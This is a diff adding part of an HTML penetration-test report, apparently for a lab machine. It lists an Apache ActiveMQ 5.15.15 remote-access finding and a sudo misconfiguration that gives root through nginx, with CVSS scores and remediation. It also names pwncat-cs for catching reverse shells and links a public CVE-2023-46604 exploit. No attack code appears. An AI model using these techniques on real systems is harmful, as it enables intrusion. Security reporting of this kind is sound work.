+            <tr id="b32c9243-86a9-40cc-9f6e-c5c87c0058c1">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to gain access to the web server as 
+                <code>
+                  activemq
+                </code>
+                 user.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    integrity
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="4ed147cd-c25b-43f1-a950-5af5f54e6c53">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Update 
+                
+                  Apache ActiveMQ
+                
+                 at least to 
+                
+                  5.15.16
+                
+                , or to the latest version if possible.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="d75201c8-5d41-4b90-81d1-ff1a3c788838">
+          
+            Sudo permissions misconfiguration
+          
+        </h2>
+        <table id="cc741348-8683-4d7a-84cf-4b3ac5c05717">
+          <thead>
+            <tr id="622bbdd2-6aed-4271-993d-b1ee9e41c1c3">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="b953e291-4599-4d22-9495-a4803e29a7ea">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Local system
+              </td>
+            </tr>
+            <tr id="95b26354-09f1-4188-8c7e-32af0ab653e8">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.8
+                
+              </td>
+            </tr>
+            <tr id="84ec481d-18a7-4b85-8f81-64ff3ab1173e">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  HIGH
+                
+              </td>
+            </tr>
+            <tr id="99d69d46-3264-42bc-8299-b210b8aed12b">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Local
+                
+              </td>
+            </tr>
+            <tr id="ddbd38ec-992a-44bf-9788-cebcf8e4d535">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to gain full administrative access to the entire system.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    integrity
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the entire system component.
+              </td>
+            </tr>
+            <tr id="2b945392-915e-42ee-808e-3110b0b28db1">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Review sudo rights to avoid malicious user to gain root access by leveraging nginx.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="0281ce21-801c-4ee7-87e8-fdc848d4f34e">
+          Tools used
+        </h1>
+        <table id="c19cae55-a109-404b-a634-67151aff904d">
+          <thead>
+            <tr id="445bf8de-1c91-45b0-b294-2f0fbb5e8502">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="01d79b61-95ba-4d15-841b-5881ad6420fb">
+              <td id="`&gt;MF">
+                <a href="https://nmap.org/book/man.html">
+                  Nmap
+                </a>
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan services versions
+                
+              </td>
+            </tr>
+            <tr id="954ff195-5089-4784-a1f3-4aca8d4adcb0">
+              <td id="`&gt;MF">
+                <a href="https://github.com/calebstewart/pwncat">
+                  Pwncat-cs
+                </a>
+              </td>
+              <td id="A|qY">
+                - Listen for reverse shell connection
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="9cab1501-a2ec-43c1-a852-fe121492f71a">
+          Sources
+        </h1>
+        <ul id="250f541f-48e5-4bf9-8e92-6a21f213bb7f">
+          <li>
+            
+              Apache ActiveMQ 5.15.15
+            
+             vulnerabilities : 
+            <a href="https://nvd.nist.gov/vuln/search/results?adv_search=true&amp;isCpeNameSearch=true&amp;query=cpe%3A2.3%3Aa%3Aapache%3Aactivemq%3A5.15.15%3A*%3A*%3A*%3A*%3A*%3A*%3A*">
+              https://nvd.nist.gov/vuln/search/results?adv_search=true&amp;isCpeNameSearch=true&amp;query=cpe%3A2.3%3Aa%3Aapache%3Aactivemq%3A5.15.15%3A*%3A*%3A*%3A*%3A*%3A*%3A*
+            </a>
+          </li>
+        </ul>
+        <ul id="e04473e1-014e-4e0a-b65e-70228407f179">
+          <li>
+            Exploit 
+            
+              Apache ActiveMQ
+            
+             : 
+            <a href="https://github.com/evkl1d/CVE-2023-46604">
+              https://github.com/evkl1d/CVE-2023-46604
+            </a>
+          </li>
+        </ul>
+      </div>
+    
+    <span>
+    </span>
+  
+
